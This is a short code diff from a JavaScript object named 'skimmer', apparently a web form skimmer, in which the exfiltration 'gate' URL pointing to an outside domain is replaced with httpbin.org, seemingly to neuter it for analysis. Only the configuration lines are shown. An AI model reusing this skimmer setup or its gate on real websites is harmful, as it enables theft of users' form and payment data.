@@ -4,7 +4,7 @@ var skimmer = {
 
    snd: null,
 
-   gate: ‘https://webfotce.me/js/form.js’,
+   gate: ‘https://httpbin.org/post’,
 
    myid: (function(cname) {
 
